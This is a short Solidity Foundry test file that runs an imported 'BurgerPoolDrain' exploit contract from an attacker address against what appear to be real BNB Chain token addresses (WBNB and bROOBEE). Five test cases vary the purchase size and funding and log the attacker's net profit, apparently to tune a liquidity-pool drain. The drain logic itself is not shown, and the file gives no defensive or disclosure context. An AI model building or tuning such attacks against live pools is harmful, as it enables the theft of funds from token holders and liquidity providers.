// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerPoolDrain.sol";

contract BurgerPoolTest5 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant bROOBEE = 0xE64F5Cb844946C1F102Bd25bBD87a5aB4aE89Fbe;

    function _testPool(
        uint256 buyWbnb, uint256 pairPct, uint256 fundBnb
    ) internal returns (int256) {
        address att = makeAddr("attacker");
        vm.deal(att, fundBnb);
        vm.startPrank(att);

        uint256 bef = att.balance;
        BurgerPoolDrain e = new BurgerPoolDrain();

        try e.attack{value: fundBnb - 1 ether}(bROOBEE, buyWbnb, 0, pairPct) {
            vm.stopPrank();
            return int256(att.balance) - int256(bef);
        } catch {
            vm.stopPrank();
            return type(int256).min;
        }
    }

    function test_60() public { emit log_named_int("60", _testPool(60 ether, 50, 100 ether)); }
    function test_70() public { emit log_named_int("70", _testPool(70 ether, 50, 120 ether)); }
    function test_80() public { emit log_named_int("80", _testPool(80 ether, 50, 150 ether)); }
    function test_90() public { emit log_named_int("90", _testPool(90 ether, 50, 160 ether)); }
    function test_100() public { emit log_named_int("100", _testPool(100 ether, 50, 200 ether)); }
}
